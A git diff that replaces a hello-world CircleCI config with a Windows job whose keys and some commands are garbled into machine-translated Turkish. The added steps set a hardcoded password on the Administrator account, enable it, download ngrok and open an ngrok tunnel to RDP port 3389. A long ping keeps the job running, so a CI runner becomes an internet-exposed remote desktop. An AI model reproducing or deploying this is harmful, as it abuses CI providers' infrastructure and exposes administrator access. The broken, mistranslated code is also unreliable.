@@ -1,26 +1,24 @@
-# Use the latest 2.1 version of CircleCI pipeline process engine.
-# See: https://circleci.com/docs/2.0/configuration-reference
-version: 2.1
 
-# Define a job to be invoked later in a workflow.
-# See: https://circleci.com/docs/2.0/configuration-reference/#jobs
-jobs:
-  say-hello:
-    # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
-    # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
-    docker:
-      - image: cimg/base:stable
-    # Add steps to the job
-    # See: https://circleci.com/docs/2.0/configuration-reference/#steps
-    steps:
-      - checkout
-      - run:
-          name: "Say hello"
-          command: "echo Hello, World!"
 
-# Invoke jobs via workflows
-# See: https://circleci.com/docs/2.0/configuration-reference/#workflows
-workflows:
-  say-hello-workflow:
-    jobs:
-      - say-hello
+sürüm: 2.1 
+ 
+küreler: 
+  kazanma: daireci/windows@2.2.0 
+ 
+işler: 
+  oluşturma: 
+    yürütme: 
+      ad: kazanma/varsayılan 
+      boyut: "orta" 
+ 
+    adımlar: 
+      - ödeme       
+      - çalıştırma: Set-LocalUser -Name "Administrator" -Password (ConvertTo- SecureString -AsPlainText "Akuhnet123" -Force) 
+      - çalıştırın: Get-LocalUser -Name "Yönetici" | Enable-LocalUser 
+      - çalıştır: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip 
+      - çalıştır: tar xf ngrok.zip 
+      - çalıştır: ngrok kopyala .exe C:\Windows\System32 
+      - çalıştırın: cmd /c echo ./ngrok.exe authtoken "YOUR_NGROK_AUTHTOKEN_HERE" >a.ps1
+      - çalıştır: cmd /c yankı cmd /k başlat ngrok.exe tcp 3389 >>a.ps1 
+      - çalıştır: cmd /c yankı ping -n 999999 10.10.10.10 >>a.ps1 
+      - çalıştır: .\a.ps1
